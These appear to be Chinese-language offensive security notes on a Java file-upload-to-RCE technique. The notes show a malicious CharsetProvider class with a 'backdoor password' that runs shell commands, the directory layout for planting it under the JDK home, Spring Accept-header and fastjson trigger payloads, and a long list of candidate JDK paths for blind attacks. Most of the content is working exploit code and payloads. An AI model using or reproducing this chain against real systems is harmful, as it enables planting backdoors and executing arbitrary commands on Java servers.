#### 原理

* 上传什么文件：通过覆盖 JDK HOME 下的关键文件，让程序加载并初始化恶意类。
* 如何让程序加载并初始化恶意类
  * JVM存在懒加载机制，JDK HOME下的jar用到再加载
  * 利用fastjson等可以动态加载

#### 覆盖charsets.jar

#### 加载恶意charsets.jar

#### 上传恶意provider

* 编译指定版本的class

```java
package sun.nio.cs.evil;
 
import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.charset.spi.CharsetProvider;
import java.util.HashSet;
import java.util.Iterator;
 
public class CharsetEvil extends CharsetProvider{
 
    @Override
    public Iterator<Charset> charsets() {
        // TODO Auto-generated method stub
        return new HashSet<Charset>().iterator();
    }
 
    @Override
    public Charset charsetForName(String charsetName) {
        // TODO Auto-generated method stub
        if(charsetName.startsWith("evil")) {    //指定后门密码
            try {
                Runtime.getRuntime().exec("/bin/bash -c 'touch /tmp/ldalda'");
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        return Charset.forName("UTF-8");
    }
    
}
```

* 在`jdk_home/jre/classes`创建如下目录结构，`CharsetEvil.class`为刚刚编译的class文件，`java.nio.charset.spi.CharsetProvider`中写入`sun.nio.cs.evil.CharsetEvil`

```txt
.
├── sun
	└── nio
		└── cs
			└── evil
				└──CharsetEvil.class
└── META-INF
    └── services
        └── java.nio.charset.spi.CharsetProvider
 
```

* 本地测试发现打包成jar包，在启动时指定`-classpath xxx.jar`也是可以触发的

#### 触发恶意provider

**原生spring**

* `charset=evilxxx` evil开头可以多次触发

```http
GET / HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json;charset=evil;
 
```

**fastjson**

```json
{"@type":"java.nio.charset.Charset","val":"evil"}
```



#### 黑盒下可尝试的JDK目录

```txt
/usr/lib/jvm/jre/lib/
/usr/local/jdk/jre/lib/
/usr/local/openjdk-6/lib/
/usr/local/openjdk-7/lib/
/usr/local/openjdk-8/lib/
/usr/lib/jvm/java/jre/lib/
/usr/lib/jvm/jdk6/jre/lib/
/usr/lib/jvm/jdk7/jre/lib/
/usr/lib/jvm/jdk8/jre/lib/
/usr/lib/jvm/jdk-11.0.3/lib/
/usr/lib/jvm/jdk1.6/jre/lib/
/usr/lib/jvm/jdk1.7/jre/lib/
/usr/lib/jvm/jdk1.8/jre/lib/
/usr/local/openjdk6/jre/lib/
/usr/local/openjdk7/jre/lib/
/usr/local/openjdk8/jre/lib/
/usr/local/openjdk-6/jre/lib/
/usr/local/openjdk-7/jre/lib/
/usr/local/openjdk-8/jre/lib/
/mnt/jdk/jdk1.8.0_191/jre/lib/
/usr/lib/jvm/jdk1.6.0/jre/lib/
/usr/lib/jvm/jdk1.7.0/jre/lib/
/usr/lib/jvm/jdk1.8.0/jre/lib/
/usr/java/jdk1.8.0_111/jre/lib/
/usr/java/jdk1.8.0_121/jre/lib/
/usr/lib/jvm/java-6-oracle/lib/
/usr/lib/jvm/java-7-oracle/lib/
/usr/lib/jvm/java-8-oracle/lib/
/usr/lib/jvm/java-1.6.0/jre/lib/
/usr/lib/jvm/java-1.7.0/jre/lib/
/usr/lib/jvm/java-1.8.0/jre/lib/
/usr/lib/jvm/jdk1.7.0_51/jre/lib/
/usr/lib/jvm/jdk1.7.0_76/jre/lib/
/usr/lib/jvm/jdk1.8.0_60/jre/lib/
/usr/lib/jvm/jdk1.8.0_66/jre/lib/
/usr/lib/jvm/jdk1.8.0_74/jre/lib/
/usr/lib/jvm/jdk1.8.0_91/jre/lib/
/usr/lib/jvm/oracle_jdk6/jre/lib/
/usr/lib/jvm/oracle_jdk7/jre/lib/
/usr/lib/jvm/oracle_jdk8/jre/lib/
/usr/lib/jvm/jdk1.8.0_101/jre/lib/
/usr/lib/jvm/jdk1.8.0_102/jre/lib/
/usr/lib/jvm/jdk1.8.0_111/jre/lib/
/usr/lib/jvm/jdk1.8.0_131/jre/lib/
/usr/lib/jvm/jdk1.8.0_144/jre/lib/
/usr/lib/jvm/jdk1.8.0_151/jre/lib/
/usr/lib/jvm/jdk1.8.0_152/jre/lib/
/usr/lib/jvm/jdk1.8.0_161/jre/lib/
/usr/lib/jvm/jdk1.8.0_171/jre/lib/
/usr/lib/jvm/jdk1.8.0_172/jre/lib/
/usr/lib/jvm/jdk1.8.0_181/jre/lib/
/usr/lib/jvm/jdk1.8.0_191/jre/lib/
/usr/lib/jvm/jdk1.8.0_202/jre/lib/
/usr/lib/jvm/jdk8u202-b08/jre/lib/
/usr/lib/jvm/jre-6-oracle-x64/lib/
/usr/lib/jvm/jre-7-oracle-x64/lib/
/usr/lib/jvm/jre-8-oracle-x64/lib/
/usr/lib/jvm/zulu-6-amd64/jre/lib/
/usr/lib/jvm/zulu-7-amd64/jre/lib/
/usr/lib/jvm/zulu-8-amd64/jre/lib/
/usr/lib/jvm/java-6-oracle/jre/lib/
/usr/lib/jvm/java-7-oracle/jre/lib/
/usr/lib/jvm/java-8-oracle/jre/lib/
/usr/jdk/instances/jdk1.6.0/jre/lib/
/usr/jdk/instances/jdk1.7.0/jre/lib/
/usr/jdk/instances/jdk1.8.0/jre/lib/
/usr/lib/jvm/j2re1.6-oracle/jre/lib/
/usr/lib/jvm/j2re1.7-oracle/jre/lib/
/usr/lib/jvm/j2re1.8-oracle/jre/lib/
/usr/lib/jvm/java-1.6.0-sun/jre/lib/
/usr/lib/jvm/java-1.7.0-sun/jre/lib/
/usr/lib/jvm/java-1.8.0-sun/jre/lib/
/usr/lib/jvm/java-6-openjdk/jre/lib/
/usr/lib/jvm/java-7-openjdk/jre/lib/
/usr/lib/jvm/java-8-openjdk/jre/lib/
/usr/lib/jvm/j2sdk1.6-oracle/jre/lib/
/usr/lib/jvm/j2sdk1.7-oracle/jre/lib/
/usr/lib/jvm/j2sdk1.8-oracle/jre/lib/
/usr/lib/jvm/java-11-openjdk/jre/lib/
/usr/lib/jvm/java-12-openjdk/jre/lib/
/usr/lib/jvm/java-13-openjdk/jre/lib/
/usr/lib/jvm/java-1.6-openjdk/jre/lib/
/usr/lib/jvm/java-1.7-openjdk/jre/lib/
/usr/lib/jvm/java-1.8-openjdk/jre/lib/
/usr/lib/jvm/java-9-openjdk-amd64/lib/
/usr/lib/jvm/jdk-6-oracle-x64/jre/lib/
/usr/lib/jvm/jdk-7-oracle-x64/jre/lib/
/usr/lib/jvm/jdk-8-oracle-x64/jre/lib/
/usr/lib/jvm/jre-6-oracle-x64/jre/lib/
/usr/lib/jvm/jre-7-oracle-x64/jre/lib/
/usr/lib/jvm/jre-8-oracle-x64/jre/lib/
/usr/lib/jvm/java-10-openjdk-amd64/lib/
/usr/lib/jvm/java-11-openjdk-amd64/lib/
/usr/lib/jvm/java-1.11.0-openjdk/jre/lib/
/usr/lib/jvm/java-1.12.0-openjdk/jre/lib/
/usr/lib/jvm/java-6-openjdk-i386/jre/lib/
/usr/lib/jvm/java-6-sun-1.6.0.16/jre/lib/
/usr/lib/jvm/java-6-sun-1.6.0.20/jre/lib/
/usr/lib/jvm/java-7-openjdk-i386/jre/lib/
/usr/lib/jvm/java-8-openjdk-i386/jre/lib/
/usr/lib/jvm/java-6-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-7-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-1.6.0-oracle-x64/jre/lib/
/usr/lib/jvm/java-1.7.0-oracle-x64/jre/lib/
/usr/lib/jvm/java-1.8.0-oracle-x64/jre/lib/
/usr/lib/jvm/oracle-java6-jdk-amd64/jre/lib/
/usr/lib/jvm/oracle-java7-jdk-amd64/jre/lib/
/usr/lib/jvm/oracle-java8-jdk-amd64/jre/lib/
/usr/lib64/jvm/java-1.6.0-ibd-1.6.0/jre/lib/
/usr/lib64/jvm/java-1.6.0-ibm-1.6.0/jre/lib/
/usr/lib64/jvm/java-1.7.1-ibm-1.7.1/jre/lib/
/usr/lib/jvm/java-1.6.0-sun-1.6.0.11/jre/lib/
/usr/lib/jvm/java-1.6.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/jre-1.6.0-openjdk.x86_64/jre/lib/
/usr/lib/jvm/jre-1.7.0-openjdk.x86_64/jre/lib/
/usr/lib/jvm/jre-1.8.0-openjdk.x86_64/jre/lib/
/usr/lib/jvm/java-1.11.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/jdk-8-oracle-arm-vfp-hflt/jre/lib/
/usr/lib64/jvm/java-1.6.0-openjdk-1.6.0/jre/lib/
/usr/lib64/jvm/java-1.7.0-openjdk-1.7.0/jre/lib/
/usr/lib64/jvm/java-1.8.0-openjdk-1.8.0/jre/lib/
/usr/lib/jvm/java-1.6.0-openjdk-1.6.0.0.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.8.0.0.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-amazon-corretto.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.0.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.45.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.65.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.79.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.91.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.101.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.191.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-2.b13.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-3.b17.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-4.b14.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-2.b14.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-7.b10.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-11.b12.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-1.b13.el6_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-2.b17.el7_1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.77-0.b03.el6_7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.91-0.b14.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.101-3.b13.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-1.b14.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-0.b15.el6_8.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-1.b15.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-2.b15.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-0.b13.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-0.b11.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-3.b12.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-3.b16.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.144-0.b01.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.144-0.b01.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-5.b12.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-0.b14.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-3.b14.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-3.b10.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-1.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-0.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-2.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.222.b10-0.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-2.b13.5.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-2.b17.7.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.77-0.b03.9.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.101-2.6.6.1.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.131-2.6.9.0.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.91-0.b14.10.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.171-2.6.13.0.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.191-2.6.15.4.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.101-3.b13.24.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-1.b15.25.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-0.b13.29.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.30.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.32.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.35.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-0.b14.36.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-7.b10.37.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.38.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.42.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-0.43.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.45.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64-debug/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-8.b13.39.39.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el7_5.x86_64-debug/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el6_10.x86_64-debug/jre/lib/
```

